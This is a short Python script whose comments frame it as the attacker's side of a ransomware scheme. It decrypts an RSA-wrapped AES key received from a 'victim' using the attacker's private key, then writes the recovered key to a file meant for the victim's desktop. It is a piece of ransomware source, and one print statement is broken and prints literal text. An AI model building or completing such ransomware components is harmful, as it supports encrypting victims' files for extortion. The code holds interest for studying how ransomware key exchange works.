from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES,PKCS1_OAEP

with open ('sendme.txt','rb') as t:  #victims sends AES key to attacker
    key=t.read()
    #print(key)
privateKey=RSA.import_key(open('private.txt').read())   #attacker reads the key 
privateDecrypt=PKCS1_OAEP.new(privateKey)          #making object 
decryptedSymKey=privateDecrypt.decrypt(key)  #decryptes the encrypted key using the given private key
with open('desktop.txt','wb') as t:         #writes on text file that needs to be placed on victim's desktop
    t.write(decryptedSymKey)
print('decrypted key{decryptedSymkey}')     
print('decryption is completed!')    
